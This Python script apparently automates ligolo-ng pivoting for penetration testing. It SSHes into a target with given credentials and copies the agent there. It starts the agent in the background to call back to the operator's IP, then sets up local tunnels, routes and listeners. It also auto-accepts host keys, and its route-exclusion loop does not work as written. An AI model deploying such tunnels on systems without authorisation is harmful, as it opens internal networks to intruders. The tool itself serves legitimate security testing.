#!/usr/bin/env python
import argparse
import logging
import paramiko
import os
import json
from getpass import getpass
import pexpect
import subprocess
import shlex

"""
    Script to automate ligolo tunnels creation.
    This script will connect to remote host, get routes, copy ligolo agent
    Then will setup local tunnel interface, routes, and start ligolo
"""
#####  CONFIGURATION ######
# REPLACE PATHS HERE
LIGOLO_AGENT = "/opt/ligolo-ng/agentlin64"
LIGOLO_PROXY = "/opt/ligolo-ng/proxylin64"

CACHE_PATH = "/tmp/autogolo"

# Do not get routes for tunnel / docker / ... interface
ROUTE_EXCLUDE = ["tun", "docker"]
# Ignore /32 Routes
IGNORE_SLASH32 = True

# Base ligolo port: (effective port will be this + ligolo_id)
LIGOLO_BASE_PORT = 11600
LIGOLO_WAIT_TIME =  45

# ==================================
args = None
expect_proc = None
state = {}


FORMAT = '%(asctime)s - %(levelname)s - %(message)s'
logging.basicConfig(format=FORMAT, level=logging.INFO)  # Change level here
logger = logging.getLogger(__name__)
# TODO add file logging for output

def cleanup():
    logger.info("Cleaning up ...")

    for route in state["routes"]:
        logger.info(f"ip route del {route}")
        run_local_command(f"ip route del {route}", True)
    
    logger.info(f"Deleting tunnel ligolo{args.ligolo_id}")
    run_local_command(f"ip link set ligolo{args.ligolo_id} down", True)
    run_local_command(
        f"ip tuntap del mode tun ligolo{args.ligolo_id}", True)

def check_privileges():
    if not os.environ.get("SUDO_UID") and os.geteuid() != 0:
        raise PermissionError(
            "You need to run this script with sudo or as root.")


def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "-ho",
        "--host",
        help="Target IP/Host",
        required=True
    )
    parser.add_argument(
        "-id",
        "--ligolo-id",
        help="Ligolo Session ID",
        type=int,
        default=1
    )
    parser.add_argument(
        "-i",
        "--local-ip",
        help="Local IP",
        required=True
    )
    parser.add_argument(
        "-t",
        "--thru",
        help="Tunnel goes through instance",
        type=int,
        default=None
    )
    parser.add_argument(
        "-u",
        "--user",
        help="User",
        required=True
    )
    parser.add_argument(
        "-pw",
        "--password",
        help="Password",
    )
    parser.add_argument(
        "-p",
        "--port",
        help="Port",
        default=22
    )
    parser.add_argument(
        "-c",
        "--clean",
        help="Cleanup only (remove routes, tunnels, etc...)",
        action='store_true'
    )
    parser.add_argument(
        "-l",
        "--listeners",
        help="Automatically create this amount of ligolo listeners. Default 5.",
        default=5,
        type=int
    )
    parser.add_argument(
        "-pvk",
        "--private-key",
        help="Use Private key for auth (RSA, no password)",
        default=None
    )
    args = parser.parse_args()
    
    if not args.password and not args.private_key:
        args.password = getpass()
    return args


def run_remote_command(cmd, raise_if_stderr=True, use_channel = False):
    global args
    client = paramiko.SSHClient()
    if "remote_shell_cmds" not in state:
        state["remote_shell_cmds"] = [cmd]
    else:
        state["remote_shell_cmds"].append(cmd)

    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    if args.private_key:
        key = paramiko.RSAKey.from_private_key_file(args.private_key)
        client.connect(args.host, args.port, username=args.user, key = key)
    else:
        client.connect(args.host, args.port, username=args.user, password=args.password)
        

    logger.debug("Executing %s on host %s", cmd, args.host)
    if not use_channel:
        stdin, stdout, stderr = client.exec_command(cmd)
        stdout = stdout.readlines()
        stderr = stderr.read().strip()
        if stderr and raise_if_stderr:
            logger.error("Error in command %s:\n%s", cmd, stderr)
            raise Exception(f"Error in command {cmd}:\n{stderr}")
    else:
        transport = client.get_transport()
        channel = transport.open_session()
        channel.exec_command(cmd) 
        stdout = "" # TODO See if we can get output, although don't need it rn
    client.close()
    logger.debug("%s = %s", cmd, stdout)

    return stdout

def run_local_command(cmd, ignore_err = False):
    global state
    logger.debug("Running local command %s", cmd)
    proc = subprocess.run(shlex.split(
        cmd), stdout=subprocess.PIPE,  stderr=subprocess.PIPE)
    if proc.returncode != 0:
        logger.error("Error happened in command %s: %s", cmd, proc.stderr)
        if ignore_err:
            return
        proc.check_returncode()
    state["shell_cmds"].append(cmd)
    stdout = proc.stdout
    if type(stdout).__name__ == "bytes":
        stdout = stdout.decode("utf-8")
        stdout = [x.strip() for x in stdout.split("\n")]
    logger.debug("%s:\n%s\nErr:\n%s", cmd, stdout, proc.stderr)
    return stdout

def write_state():
    global state, args, CACHE_PATH
    logger.debug("Writing state...")
    if not os.path.isdir(CACHE_PATH):
        os.makedirs(CACHE_PATH, exist_ok=True)
    with open(os.path.join(CACHE_PATH, f"{args.ligolo_id}.json"), "w") as f:
        f.write(json.dumps(state, indent=4))


def copy_file_to_remote(filename, remotepath=None):
    global args
    if not remotepath:
        remotepath = os.path.join("/home", args.user)
    basename = os.path.basename(filename)
    remote_file = os.path.join(remotepath, basename)
    logger.info("Copying file: scp %s  %s:%s",
                filename, args.host, remote_file)
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    if args.private_key:
        key = paramiko.RSAKey.from_private_key_file(args.private_key)
        ssh.connect(args.host, args.port, username=args.user, key = key)
    else:
        ssh.connect(args.host, args.port, username=args.user, password=args.password)
        
    scp = ssh.open_sftp()

    scp.put(filename, remote_file)

    # Close the SCP client
    scp.close()

    # Close the SSH client
    ssh.close()


def init():
    state["shell_cmds"] = []
    state["remote_shell_cmds"] = []
    state["ligolo_cmds"] = []


def get_remote_routes():
    global state, ROUTE_EXCLUDE
    state["routes"] = []
    local_routes = get_local_routes()
        
        
    for route in run_remote_command("ip route"):
        route = route.strip()
        if not route:
            continue
        if "default" in route:
            continue
        for rex in ROUTE_EXCLUDE:
            if rex in route:
                logger.debug("Not including route %s", route)
                continue
        route = route.split(" ")[0]
        if "/32" in route and IGNORE_SLASH32:
            logger.debug("Ignoring /32 route %s", route)
            continue
        if route in local_routes:
            logger.info("Skipping local route %s", route)
            continue
        state["routes"].append(route)
    logger.info("Remote routes: %s", state["routes"])
    write_state()

def get_local_routes():
    routes = []
    for route in run_local_command("ip route"):
        route = route.strip()
        if not route:
            continue
        if "default" in route:
            continue
       
        route = route.split(" ")[0]        
        routes.append(route)
    logger.info("local routes: %s", routes)
    return routes
    



def create_tunnels_and_routes():
    global args, state
    run_local_command(
        f"ip tuntap add user {os.getlogin()} mode tun ligolo{args.ligolo_id}")
    run_local_command(f"ip link set ligolo{args.ligolo_id} up")
    for route in state["routes"]:
        run_local_command(f"ip route add {route} dev ligolo{args.ligolo_id}")


def start_ligolo_remote():
    global args
    logger.info("Starting remote ligolo agent...")
    ligolo = os.path.basename(LIGOLO_AGENT)
    port = str(LIGOLO_BASE_PORT+args.ligolo_id)
    remotepath = os.path.join("/home", args.user, ligolo)
    
    run_remote_command(
        f"sleep 10 && nohup {remotepath} --connect {args.local_ip}:{port} -ignore-cert > {remotepath}.log 2>&1 &", use_channel=True)


def pexpect_output_callback(output):
    global args, state, expect_proc
    try:
        if "Agent joined" in output.decode("utf8"):
            logger.info("Starting tunnel / listeners ...")
            logger.debug(expect_proc.before)
            expect_proc.sendline("session")
            expect_proc.expect("Specify a session :")
            logger.debug(expect_proc.before)
            expect_proc.sendline("1")
            expect_proc.expect('] »')
            for i in range(1, args.listeners+1):
                port = str(LIGOLO_BASE_PORT+i)

                lcmd = f"listener_add --tcp --addr 0.0.0.0:{port} --to 127.0.0.1:{port}"
                logger.info("Adding listener %s", lcmd)
                expect_proc.sendline(lcmd)
                state["ligolo_cmds"].append(lcmd)

            tuncmd = f"start --tun ligolo{args.ligolo_id}"
            state["ligolo_cmds"].append(tuncmd)
            logger.info("Starting listener")
            expect_proc.sendline(tuncmd)
            logger.debug(expect_proc.before)

    except:
        pass
    finally:
        return output

def start_ligolo_local():
    global args, state, expect_proc
    logger.info("Starting local ligolo proxy...")
    port = str(LIGOLO_BASE_PORT+args.ligolo_id)
    cmd = f"{LIGOLO_PROXY} -selfcert --laddr 0.0.0.0:{port}"
    state["ligolo_cmds"].append(cmd)
    expect_proc = pexpect.spawn(cmd, encoding='utf8')
    logger.info("Will attempt to set ligolo session automatically, and will go interactive in any case")

    expect_proc.interact(output_filter=pexpect_output_callback)


def show_shell_commands():
    global state
    logger.info("\n" + "#"*50 + "\nLocal Shell Commands:\n%s\n" +
                "#"*50 + "\nRemote Shell Commands:\n%s\n" + "#"*50,
                "\n".join(state["shell_cmds"]),
                "\n".join(state["remote_shell_cmds"]))


def main():
    global args
    check_privileges()
    init()
    
    args = parse_args()
    try:            
        get_remote_routes()
        create_tunnels_and_routes()
        copy_file_to_remote(LIGOLO_AGENT)
        start_ligolo_remote()
        show_shell_commands()
        write_state()
        start_ligolo_local()
    except Exception as e:
        logger.error("Error: %s", e, exc_info=True)
    finally:
        cleanup()


if __name__ == "__main__":
    main()
